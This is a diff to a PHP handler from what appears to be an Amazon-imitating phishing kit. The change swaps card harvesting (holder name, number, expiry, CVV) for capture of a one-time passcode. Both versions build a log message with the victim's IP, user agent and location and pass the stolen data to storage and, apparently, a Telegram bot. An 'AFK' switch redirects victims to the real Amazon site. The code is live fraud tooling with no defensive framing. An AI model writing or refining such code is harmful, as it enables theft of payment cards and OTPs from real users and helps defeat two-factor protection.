@@ -5,26 +5,25 @@
 */
 session_start();
 error_reporting(0);
-# Adding Settings
 include('function.php');
 $settings = include('../config.php');
 require_once __DIR__ . '/../storage/storage.php';
-# User Agent 
 
-$useragent = $_SERVER['HTTP_USER_AGENT'];
+$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
 
-#
-$holder .= $_POST['holder'];
-$ccnum .= $_POST['ccnum'];
-$ccexp .= $_POST['EXP1']."/".$_POST['EXP2'];
-$cvv2 .= $_POST['cvv2'];
+if ($otp === '') {
+    header('Location: otp.php?error=1');
+    exit;
+}
 
-# Logs
-$message .= "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
-$message .= "➤ [ Card Name ] : {$holder}\n";
-$message .= "➤ [ Card Num ] : {$ccnum}\n";
-$message .= "➤ [ Card Exp ] : {$ccexp}\n";
-$message .= "➤ [ Card Cvv ] : {$cvv2}\n";
+$payload = [
+    'otp' => $otp,
+];
+
+append_login_session_step(session_id(), 'otp', $payload);
+
+$message = "🔥 AM4ZON OTP FROM - {$IP} 🔥\n\n";
+$message .= "➤ [ OTP ] : {$otp}\n";
 $message .= "--------- MORE INFO -----------\n";
 $message .= "➤ [ IP Address ] : {$IP}\n";
 $message .= "➤ [ User-Agent ] : {$useragent}\n";
@@ -34,19 +33,6 @@ $message .= "➤ [ City(IP) ]   : {$city}\n";
 $message .= "➤ [ Country ]    : {$countryname}\n";
 $message .= "➤ [ Date ]       : {$date}\n";
 $message .= ".--------------------------------.\n";
-
-# Persist step data
-$payload = [
-    'card_name' => $holder,
-    'card_number' => $ccnum,
-    'expiry' => $ccexp,
-    'cvv' => $cvv2
-];
-
-append_login_session_step(session_id(), 'card', $payload);
-
-
-# Send Bot
 
 if (
     $settings['telegram'] == "1"
@@ -71,7 +57,7 @@ if (
 if (is_afk_enabled()) {
     header('Location: https://www.amazon.com');
 } else {
-    header('Location: dashboard.php?awaiting_otp=1');
+    header('Location: dashboard.php?otp_submitted=1');
 }
 exit;
 ?>
